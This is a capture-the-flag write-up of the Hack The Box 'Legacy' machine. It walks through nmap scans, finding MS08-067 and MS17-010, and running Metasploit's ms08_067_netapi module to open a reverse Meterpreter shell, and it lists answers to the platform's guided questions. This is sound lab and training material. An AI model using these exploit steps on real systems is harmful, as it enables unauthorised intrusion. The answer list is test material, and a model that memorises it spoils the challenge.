![](assets/Pasted%20image%2020241011232433.png)
# Machine Name: Legacy
**Platform:** Hack The Box
**Difficulty:** Easy
**OS:** Windows

## Introduction

Legacy is a fairly straightforward beginner-level machine which demonstrates the potential security risks of SMB on Windows. Only one publicly available exploit is required to obtain administrator access.
## Recon

* **Nmap Scan:** `nmap legacy.htb -sVC -T4 -oN ~/Desktop/nmap/legacy.txt`

```bash
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:6e:b5 (VMware)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2024-10-16T19:24:21+03:00
|_clock-skew: mean: 5d00h27m39s, deviation: 2h07m16s, median: 4d22h57m39s

```

The machine seems to have an open SMB  at port 445. No http open, so I'm assuming this is where we should be digging 

## Vulnerability Identification

* **Vulnerability 1:** Vuln Scan `nmap legacy.htb --script vuln -oN ~/Desktop/nmap/legacy_vuln.txt`

```bash

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-11 23:27 JST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for legacy.htb (10.129.227.181)
Host is up (0.18s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:ls

|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 68.34 seconds
```

The vuln scan gave me two CVE related SMB RCE . Here is the result in Metasploit

```bash
msf6 > search CVE-2008-4250

Matching Modules
================

   #   Name                                                             Disclosure Date  Rank   Check  Description
   -   ----                                                             ---------------  ----   -----  -----------
   0   exploit/windows/smb/ms08_067_netapi                              2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
   1     \_ target: Automatic Targeting                                 .                .      .      .
   2     \_ target: Windows 2000 Universal                              .                .      .      .
   3     \_ target: Windows XP SP0/SP1 Universal                        .                .      .       

```
## Exploitation

* **Gaining Initial Access:** Using the `ms08_067_netapi` module , I was able to get foothold access to the target easily.

```bash

msf6 exploit(windows/smb/ms08_067_netapi) > set rhosts 10.129.227.181
rhosts => 10.129.227.181
msf6 exploit(windows/smb/ms08_067_netapi) > set lhost tun0
lhost => 10.10.14.3
msf6 exploit(windows/smb/ms08_067_netapi) > check
[+] 10.129.227.181:445 - The target is vulnerable.
msf6 exploit(windows/smb/ms08_067_netapi) > exploit

[*] Started reverse TCP handler on 10.10.14.3:4444 
[*] 10.129.227.181:445 - Automatically detecting the target...
[*] 10.129.227.181:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.129.227.181:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.129.227.181:445 - Attempting to trigger the vulnerability...
[*] Sending stage (176198 bytes) to 10.129.227.181
[*] Meterpreter session 1 opened (10.10.14.3:4444 -> 10.129.227.181:1036) at 2024-10-11 23:34:35 +0900

```

searching for `user.txt`...

```bash

meterpreter > search -f user.txt
Found 1 result...
=================

Path                                             Size (bytes)  Modified (UTC)
----                                             ------------  --------------
c:\Documents and Settings\john\Desktop\user.txt  32            2017-03-16 15:19:49 +0900
```

That was pretty straight forward. The file was accessible and also `root.txt` was in the `Administrator/Desktop` which is also under `Documents and Settings` directory.
## Guided Mode ( if any )

1. How many TCP ports are open on Legacy? : `3`
	1. Simple Nmap will give me the result
2. What is the 2008 CVE ID for a vulnerability in SMB that allows for remote code execution? : `CVE-2008-4250`
	1. --script vuln result had this 
3. What is the name of the Metasploit module that exploits CVE-2008-4250? : `ms08_067_netapi`
	1. msfconsole search using the CVE ID
4. When exploiting MS08-067, what user does execution run as? Include the information before and after : `NT AUTHORITY\SYSTEM`
	1. Just check the user after access
5. In addition to MS08-067, Legacy's SMB service is also vulnerable to another remote code execution vulnerability with a CVE ID from 2017. What is that ID? : `CVE-2017-0143`
	1. Vuln scan result had this 
## Lessons Learned

- Vuln scan is a friend. Try to check this for CVE info
- 

## Conclusion

* Summarize your overall experience with the machine.
* Highlight the challenges you faced and how you overcame them.
* Offer any advice to others attempting the same machine.

**Happy hacking!**